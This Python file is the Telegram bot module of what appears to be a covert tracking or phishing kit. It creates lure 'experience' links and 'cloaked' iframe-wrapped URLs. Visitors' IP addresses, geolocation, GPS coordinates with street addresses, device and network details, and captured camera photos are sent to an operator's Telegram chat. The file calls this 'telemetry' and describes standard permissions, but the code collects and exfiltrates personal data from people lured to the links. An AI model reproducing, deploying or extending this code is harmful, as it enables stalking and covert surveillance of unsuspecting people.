"""
services/telegram_service.py - Telegram Bot commands, inline keyboards, and rate-limited reporting.
"""

import time
import logging
from typing import Optional, Dict, Any, List, Tuple
from urllib.parse import urlparse
import requests
import config
from .session_service import SessionService
from .telemetry_service import TelemetryService
from .geo_service import GeoService

logger = logging.getLogger(__name__)


class TelegramService:
    def __init__(self, session_service: SessionService):
        self.session_service = session_service
        self._last_send_time = 0.0
        self._min_interval = 0.5  # Throttle to avoid Telegram rate limits

    def _throttle(self):
        """Simple throttling helper between outgoing Telegram API requests."""
        now = time.time()
        elapsed = now - self._last_send_time
        if elapsed < self._min_interval:
            time.sleep(self._min_interval - elapsed)
        self._last_send_time = time.time()

    def api_request(self, method: str, data: Optional[Dict[str, Any]] = None, files: Optional[Dict[str, Any]] = None) -> Tuple[bool, Any]:
        """Make an HTTP request to Telegram Bot API with error isolation."""
        token = config.TELEGRAM_BOT_TOKEN
        if not token:
            logger.warning("TELEGRAM_BOT_TOKEN is not configured.")
            return False, "no_token"

        self._throttle()
        url = f"https://api.telegram.org/bot{token}/{method}"
        try:
            if files:
                resp = requests.post(url, data=data or {}, files=files, timeout=20)
            else:
                resp = requests.post(url, json=data or {}, timeout=20)

            if resp.ok:
                return True, resp.json()
            else:
                logger.error(f"Telegram API {method} error: {resp.status_code} - {resp.text}")
                return False, resp.text
        except Exception as e:
            logger.error(f"Telegram API {method} exception: {e}")
            return False, str(e)

    def send_text(self, chat_id: str, text: str, reply_markup: Optional[Dict[str, Any]] = None) -> bool:
        """Send a text message to chat_id."""
        if not chat_id:
            return False
        payload = {
            "chat_id": str(chat_id),
            "text": text,
            "parse_mode": "HTML"
        }
        if reply_markup:
            payload["reply_markup"] = reply_markup

        ok, _ = self.api_request("sendMessage", data=payload)
        return ok

    def send_photo(self, chat_id: str, photo_path: str, caption: str = "") -> bool:
        """Send a photo file with caption to chat_id."""
        if not chat_id:
            return False
        try:
            with open(photo_path, "rb") as f:
                data = {"chat_id": str(chat_id), "caption": caption[:1024]}
                ok, _ = self.api_request("sendPhoto", data=data, files={"photo": f})
                return ok
        except Exception as e:
            logger.error(f"send_photo error: {e}")
            return False

    def answer_callback_query(self, callback_query_id: str, text: str = "") -> bool:
        """Acknowledge a callback query from an inline keyboard button."""
        payload = {"callback_query_id": callback_query_id}
        if text:
            payload["text"] = text
        ok, _ = self.api_request("answerCallbackQuery", data=payload)
        return ok

    def get_session_url(self, token: str, experience: str) -> str:
        """Construct public URL for a session."""
        base = config.SERVER_BASE_URL or f"http://127.0.0.1:{config.PORT}"
        if experience == "wrapped_website":
            return f"{base}/w/{token}"
        return f"{base}/s/{token}"

    def build_experience_keyboard(self, label: str = "") -> Dict[str, Any]:
        """Build an inline keyboard offering selection across all experiences."""
        buttons = []
        row = []
        # Group experiences into categories or pairs
        for exp_id, meta in config.EXPERIENCES.items():
            name = meta["name"]
            # Encode label into callback data safely (limit 64 bytes total)
            safe_label = label[:16].replace(":", "_")
            cb_data = f"exp:{exp_id}:{safe_label}"
            row.append({"text": name, "callback_data": cb_data})
            if len(row) == 2:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)

        return {"inline_keyboard": buttons}

    # ---------- Command Handlers ----------

    def handle_start(self, chat_id: str):
        text = (
            "🤖 <b>Device Telemetry & Experience Platform</b>\n\n"
            "Available commands:\n"
            "• <b>/create [label]</b> – Choose an experience & generate session link\n"
            "• <b>/wrap &lt;url&gt;</b> – Create an iframe-wrapped website link\n"
            "• <b>/sessions</b> – View your active sessions\n"
            "• <b>/status &lt;token&gt;</b> – Detailed summary of a session\n"
            "• <b>/stop &lt;token&gt;</b> – Deactivate a session\n\n"
            "<i>Type /create to get started.</i>"
        )
        self.send_text(chat_id, text)

    def handle_create_command(self, chat_id: str, label: str = ""):
        """Show experience picker inline menu."""
        text = (
            "🎮 <b>Choose an Experience for the New Session:</b>\n"
            f"{('Label: ' + label + chr(10)) if label else ''}"
            "Select the content or game that will be presented to the user:"
        )
        keyboard = self.build_experience_keyboard(label=label)
        self.send_text(chat_id, text, reply_markup=keyboard)

    def handle_experience_selection(self, chat_id: str, callback_id: str, exp_id: str, label: str):
        """Execute session creation from an inline keyboard callback."""
        self.answer_callback_query(callback_id, text="Creating session...")

        meta = config.EXPERIENCES.get(exp_id)
        if not meta:
            self.send_text(chat_id, "⚠️ Invalid experience selected.")
            return

        session = self.session_service.create_session(
            experience=exp_id,
            label=label,
            chat_id=chat_id
        )
        token = session["token"]
        url = self.get_session_url(token, exp_id)

        msg = (
            "✅ <b>Session Created Successfully!</b>\n\n"
            f"🎯 <b>Experience:</b> {meta['name']}\n"
            f"🏷 <b>Label:</b> {label or 'None'}\n"
            f"🔑 <b>Token:</b> <code>{token}</code>\n\n"
            f"🔗 <b>Public URL:</b>\n{url}\n\n"
            "<i>Standard telemetry & capabilities are active. Browser will request standard permissions.</i>"
        )
        self.send_text(chat_id, msg)

    def handle_wrap_command(self, chat_id: str, raw_target_url: str):
        """Create a wrapped website session directly."""
        url = raw_target_url.strip()
        if not url:
            self.send_text(chat_id, "Usage: <code>/wrap https://example.com</code>")
            return

        if not (url.startswith("http://") or url.startswith("https://")):
            url = "https://" + url

        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                self.send_text(chat_id, "⚠️ Invalid URL. Please provide a valid domain (e.g. https://example.com)")
                return
        except Exception:
            self.send_text(chat_id, "⚠️ Malformed URL.")
            return

        session = self.session_service.create_session(
            experience="wrapped_website",
            label="Wrapped Website",
            chat_id=chat_id,
            target_url=url
        )
        token = session["token"]
        session_url = self.get_session_url(token, "wrapped_website")

        msg = (
            "🌐 <b>Wrapped Session Created!</b>\n\n"
            f"🎯 <b>Target Site:</b> {url}\n"
            f"🔑 <b>Token:</b> <code>{token}</code>\n\n"
            f"🔗 <b>Cloaked URL:</b>\n{session_url}"
        )
        self.send_text(chat_id, msg)

    def handle_sessions_command(self, chat_id: str):
        """List active sessions for this chat."""
        sessions = self.session_service.list_sessions(chat_id=chat_id)
        if not sessions:
            self.send_text(chat_id, "ℹ️ You have no active sessions. Use <code>/create</code> to make one.")
            return

        lines = ["📋 <b>Your Sessions:</b>\n"]
        for token, s in list(sessions.items())[-10:]:
            exp_name = config.EXPERIENCES.get(s.get("experience", ""), {}).get("name", s.get("experience"))
            status = s.get("status", "active").upper()
            label = s.get("label") or "No label"
            visits = len(s.get("visits", []))
            lines.append(
                f"• <code>{token[:8]}...</code> | <b>{exp_name}</b>\n"
                f"  Status: {status} | Events: {visits} | Label: {label}\n"
                f"  Details: /status_{token}"
            )

        self.send_text(chat_id, "\n".join(lines))

    def handle_status_command(self, chat_id: str, token: str):
        """Detailed status summary for a session."""
        session = self.session_service.get_session(token)
        if not session:
            self.send_text(chat_id, f"⚠️ Session <code>{token}</code> not found.")
            return

        exp_name = config.EXPERIENCES.get(session.get("experience", ""), {}).get("name", session.get("experience"))
        perms = session.get("permissions", {})
        visits = session.get("visits", [])
        events = session.get("events", [])
        media_count = len(session.get("media", []))

        lines = [
            f"📊 <b>Session Report:</b> <code>{token}</code>",
            f"🎯 <b>Experience:</b> {exp_name}",
            f"🏷 <b>Label:</b> {session.get('label') or 'None'}",
            f"⚡ <b>Status:</b> {session.get('status', 'active').upper()}",
            f"🕒 <b>Created:</b> {session.get('created_at')}",
            f"⏳ <b>Expires:</b> {session.get('expires_at') or 'Never'}",
            "",
            "<b>Permissions State:</b>",
            f"• Camera: {perms.get('camera', 'NOT_REQUESTED')}",
            f"• Location: {perms.get('location', 'NOT_REQUESTED')}",
            f"• Media: {perms.get('media', 'NOT_REQUESTED')}",
            "",
            f"📈 <b>Visits Logged:</b> {len(visits)}",
            f"🖼 <b>Media Uploaded:</b> {media_count}",
            f"🔔 <b>Total Events:</b> {len(events)}"
        ]

        # Recent events preview
        if events:
            lines.append("\n<b>Recent Events:</b>")
            for ev in events[-5:]:
                lines.append(f"• {ev.get('timestamp', '')[11:19]} - {ev.get('event')}")

        self.send_text(chat_id, "\n".join(lines))

    def handle_stop_command(self, chat_id: str, token: str):
        """Stop an active session."""
        ok, msg = self.session_service.stop_session(token)
        if ok:
            self.send_text(chat_id, f"🛑 <b>Session Stopped:</b> <code>{token}</code>\nIt will no longer accept telemetry or uploads.")
        else:
            self.send_text(chat_id, f"⚠️ {msg}")

    # ---------- Dispatch Webhook / Polling Update ----------

    def process_update(self, update: Dict[str, Any]):
        """Process an incoming Telegram update dict."""
        try:
            # Check for callback queries (inline buttons)
            if "callback_query" in update:
                cq = update["callback_query"]
                cq_id = cq.get("id")
                data = cq.get("data", "")
                chat_id = str(cq.get("message", {}).get("chat", {}).get("id", ""))
                if data.startswith("exp:"):
                    parts = data.split(":", 2)
                    exp_id = parts[1]
                    label = parts[2] if len(parts) > 2 else ""
                    self.handle_experience_selection(chat_id, cq_id, exp_id, label)
                return

            msg = update.get("message") or update.get("edited_message") or {}
            if not msg:
                return

            chat_id = str(msg.get("chat", {}).get("id", ""))
            text = (msg.get("text") or "").strip()
            if not text or not chat_id:
                return

            if text.startswith("/start"):
                self.handle_start(chat_id)
            elif text.startswith("/create"):
                parts = text.split(maxsplit=1)
                label = parts[1] if len(parts) > 1 else ""
                self.handle_create_command(chat_id, label)
            elif text.startswith("/wrap"):
                parts = text.split(maxsplit=1)
                url = parts[1] if len(parts) > 1 else ""
                self.handle_wrap_command(chat_id, url)
            elif text.startswith("/sessions"):
                self.handle_sessions_command(chat_id)
            elif text.startswith("/status_"):
                token = text.replace("/status_", "").strip()
                self.handle_status_command(chat_id, token)
            elif text.startswith("/status"):
                parts = text.split(maxsplit=1)
                token = parts[1].strip() if len(parts) > 1 else ""
                if token:
                    self.handle_status_command(chat_id, token)
                else:
                    self.send_text(chat_id, "Usage: <code>/status &lt;token&gt;</code>")
            elif text.startswith("/stop"):
                parts = text.split(maxsplit=1)
                token = parts[1].strip() if len(parts) > 1 else ""
                if token:
                    self.handle_stop_command(chat_id, token)
                else:
                    self.send_text(chat_id, "Usage: <code>/stop &lt;token&gt;</code>")
            else:
                self.send_text(
                    chat_id,
                    "Unknown command. Try <code>/start</code> or <code>/create</code>."
                )
        except Exception as e:
            logger.error(f"Error processing Telegram update: {e}", exc_info=True)

    # ---------- Real-time Alerts ----------

    def notify_telemetry(self, session: Dict[str, Any], telemetry: Dict[str, Any], geo: Optional[Dict[str, Any]], address: Optional[str]):
        """Send formatted real-time telemetry report to operator."""
        chat_id = session.get("chat_id")
        if not chat_id:
            return

        token = session.get("token")
        exp_meta = config.EXPERIENCES.get(session.get("experience", ""), {})
        exp_name = exp_meta.get("name", session.get("experience"))

        lines = [
            f"📡 <b>Session Visit Alert</b> [<code>{token[:8]}...</code>]",
            f"🎮 <b>Experience:</b> {exp_name}",
            f"🌍 <b>IP:</b> {telemetry.get('ip', 'unknown')}",
        ]

        if geo:
            lines.append(f"🏙 <b>GeoIP:</b> {geo.get('city')}, {geo.get('region')}, {geo.get('country')}")
            lines.append(f"🏢 <b>ISP:</b> {geo.get('isp')}")

        # Battery
        bat = telemetry.get("battery")
        if bat and isinstance(bat, dict):
            lvl = bat.get("level")
            chg = " (charging)" if bat.get("charging") else ""
            lines.append(f"🔋 <b>Battery:</b> {lvl}%{chg}")

        # Location
        coords = telemetry.get("coords")
        if coords and isinstance(coords, dict):
            lat = coords.get("lat")
            lon = coords.get("lon")
            acc = coords.get("acc")
            acc_str = f" (±{int(acc)}m)" if acc else ""
            lines.append(f"📍 <b>GPS:</b> <code>{lat},{lon}</code>{acc_str}")
            if address:
                lines.append(f"🏠 <b>Address:</b> {address}")
            if acc and acc > 2000:
                lines.append("⚠️ <i>GPS accuracy is coarse (>2km).</i>")
        else:
            loc_perm = session.get("permissions", {}).get("location", "NOT_REQUESTED")
            lines.append(f"📍 <b>GPS:</b> {loc_perm}")

        # Device & OS
        os_str = telemetry.get("os", "Unknown")
        model = telemetry.get("device_model")
        if model:
            os_str += f" ({model})"
        lines.append(f"📱 <b>Device:</b> {os_str}")

        # Specs
        hw = []
        if telemetry.get("ram_gb"):
            hw.append(f"RAM: {telemetry['ram_gb']}GB")
        if telemetry.get("cpu_cores"):
            hw.append(f"CPU: {telemetry['cpu_cores']} cores")
        scr = telemetry.get("screen") or {}
        if scr.get("width"):
            hw.append(f"Screen: {scr['width']}x{scr['height']}")
        if hw:
            lines.append(f"💻 <b>Hardware:</b> {' | '.join(hw)}")

        # Network
        net = telemetry.get("network") or {}
        if net.get("type"):
            speed = f" ~{net.get('downlink')}Mbps" if net.get("downlink") else ""
            lines.append(f"📶 <b>Network:</b> {net['type'].upper()}{speed}")

        self.send_text(chat_id, "\n".join(lines))

    def notify_photo(self, session: Dict[str, Any], photo_path: str, caption_details: str = ""):
        """Send captured photo to operator."""
        chat_id = session.get("chat_id")
        if not chat_id:
            return
        caption = f"📷 Photo from session {session.get('token')[:8]}...\n{caption_details}"
        self.send_photo(chat_id, photo_path, caption=caption)
